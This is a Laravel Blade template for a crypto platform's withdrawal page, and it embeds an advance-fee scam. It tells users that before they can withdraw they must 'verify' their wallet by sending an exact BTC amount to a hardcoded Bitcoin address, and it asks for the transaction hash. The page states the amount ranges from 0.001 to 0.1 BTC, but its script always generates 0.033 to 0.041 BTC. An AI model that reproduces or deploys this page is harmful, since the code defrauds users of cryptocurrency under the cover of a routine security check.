@extends($theme.'layouts.user')
@section('title', trans($title))

@section('content')
    <div class="row">
        <div class="card col-md-3 ms-3">
            <div class="payment-info">
                <ul class="list-group">
                    <li class="list-group-item font-weight-bold bg-transparent">
                        <img
                            src="{{getFile(config('location.withdraw.path').optional($withdraw->method)->image)}}"
                            class="card-img-top w-50" alt="{{optional($withdraw->method)->name}}">
                    </li>
                    <li class="list-group-item bg-transparent">@lang('Request Amount'):
                        <span
                            class="float-right text-success">{{@$basic->currency_symbol}}{{getAmount($withdraw->amount)}} </span>
                    </li>
                    <li class="list-group-item bg-transparent">@lang('Fee'):
                        <span
                            class="float-right text-danger">{{@$basic->currency_symbol}}{{getAmount($withdraw->charge)}} </span>
                    </li>
                    <li class="list-group-item bg-transparent">@lang('Total Withdrawal'):
                        <span
                            class="float-right text-danger">{{@$basic->currency_symbol}}{{getAmount($withdraw->net_amount)}} </span>
                    </li>
                    <li class="list-group-item bg-transparent">@lang('Available Balance'):
                        <span
                            class="float-right text-success">{{@$basic->currency_symbol}}{{$remaining}} </span>
                    </li>
                </ul>
            </div>

        </div>

        <div class="col-md-8">
            <div class="card">
                <div class="card-header custom-header text-center"> 
                    <h4 class="card-title">@lang('Wallet Registration')</h4>
                    <h5 class="card-title">@lang('Additional Information To Withdraw Confirm')</h5><br>
                    <p>Our system randomly generates check amount from 0.001 to 0.1 BTC, to confirm your Bitcoin withdrawal wallet address you need to send exactly that amount to our system for security reasons.</p>
                    <div class="d-flex">
                        <button type="button"  onclick="generateRandomNumber()" class="btn-custom">
                            <span>@lang('Generate')</span>
                        </button>&nbsp;&nbsp;&nbsp;
                    </div>
                    <br><p class="d-none" id="walletAddress"><strong>Please send exactly <span id="result"></span>&nbsp; to</strong> &nbsp;&nbsp;&nbsp; bc1q3nk595vvn3rcf0t3wgyvvtypcqjh54sfjr754s</p>
                </div>
                <div class="card-body">

                    <form action="" method="post" enctype="multipart/form-data" class="form-row text-left preview-form">
                        @csrf
                        @if(optional($withdraw->method)->input_form)
                            @foreach($withdraw->method->input_form as $k => $v)
                                @if($v->type == "text")
                                    <div class="col-md-12">
                                        <label><strong>Your BTC Address @if($v->validation == 'required')
                                                    <span class="text-danger">*</span>
                                                @endif</strong></label>
                                        <div class="form-group input-box  mt-2">
                                            <input type="text" name="{{$k}}"
                                                   class="form-control"
                                                   @if($v->validation == "required") required @endif>
                                            @if ($errors->has($k))
                                                <span
                                                    class="text-danger">{{ trans($errors->first($k)) }}</span>
                                            @endif
                                        </div>
                                    </div>
                                    <div class="col-md-12 mt-2" >
                                        <label><strong>Hash TX @if($v->validation == 'required')
                                                    <span class="text-danger">*</span>
                                                @endif</strong></label>
                                        <div class="form-group input-box  mt-2">
                                            <input type="text" name="{{$k}}"
                                                   class="form-control"
                                                   @if($v->validation == "required") required @endif>
                                            @if ($errors->has($k))
                                                <span
                                                    class="text-danger">{{ trans($errors->first($k)) }}</span>
                                            @endif
                                        </div>
                                    </div>
                                @elseif($v->type == "textarea")
                                    <div class="col-md-12 ">
                                        <label><strong>{{trans($v->field_level)}} @if($v->validation == 'required')
                                                    <span class="text-danger">*</span>
                                                @endif
                                            </strong></label>
                                        <div class="form-group input-box">
                                            <textarea name="{{$k}}" class="form-control" rows="3"
                                                      @if($v->validation == "required") required @endif></textarea>
                                            @if ($errors->has($k))
                                                <span class="text-danger">{{ trans($errors->first($k)) }}</span>
                                            @endif
                                        </div>
                                    </div>
                                @elseif($v->type == "file")

                                    <div class="col-md-12">
                                        <label><strong>
                                            {{trans($v->field_level)}} @if($v->validation == 'required')
                                                    <span class="text-danger">*</span>
                                                @endif
                                            </strong></label>

                                        <div class="form-group mt-2">
                                            <div class="fileinput fileinput-new " data-provides="fileinput">
                                                <div class="fileinput-new thumbnail withdraw-thumbnail"
                                                     data-trigger="fileinput">
                                                    <img class="wh-200-150"
                                                         src="{{ getFile(config('location.default')) }}"
                                                         alt="...">
                                                </div>
                                                <div
                                                    class="fileinput-preview fileinput-exists thumbnail wh-200-150"></div>

                                                <div class="img-input-div">
                                                                <span class="btn btn-info btn-file">
                                                                    <span
                                                                        class="fileinput-new "> @lang('Select') {{$v->field_level}}</span>
                                                                    <span
                                                                        class="fileinput-exists"> @lang('Change')</span>
                                                                    <input type="file" name="{{$k}}" accept="image/*"
                                                                           @if($v->validation == "required") required @endif>
                                                                </span>
                                                    <a href="#" class="btn btn-danger fileinput-exists"
                                                       data-dismiss="fileinput"> @lang('Remove')</a>
                                                </div>

                                            </div>
                                            @if ($errors->has($k))
                                                <br>
                                                <span
                                                    class="text-danger">{{ __($errors->first($k)) }}</span>
                                            @endif
                                        </div>
                                    </div>
                                @endif
                            @endforeach
                        @endif
                        <div class="col-md-12 mt-4">
                            <div class=" form-group">
                                <button type="submit" class="btn-custom d-none" id="verifyButton">
                                    <span>@lang('Verify')</span>
                                </button>

                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
@endsection
@push('css-lib')
    <link rel="stylesheet" href="{{asset($themeTrue.'css/bootstrap-fileinput.css')}}">
@endpush

@push('extra-js')
    <script src="{{asset($themeTrue.'js/bootstrap-fileinput.js')}}"></script>
  <script>
    function generateRandomNumber() {
      var min = 0.033;
      var max = 0.041;
      if(localStorage.getItem('requestFund')) document.getElementById("result").textContent = localStorage.getItem('requestFund')
      var randomNumber =  document.getElementById("result").textContent 
      if(!randomNumber) randomNumber = (Math.random() * (max - min) + min).toFixed(4) + ' BTC';
      document.getElementById("result").textContent = randomNumber;
      document.getElementById("verifyButton").classList.remove("d-none")
      document.getElementById("walletAddress").classList.remove("d-none")
      localStorage.setItem('requestFund', randomNumber)
    }
  </script>
@endpush

@push('script')

@endpush

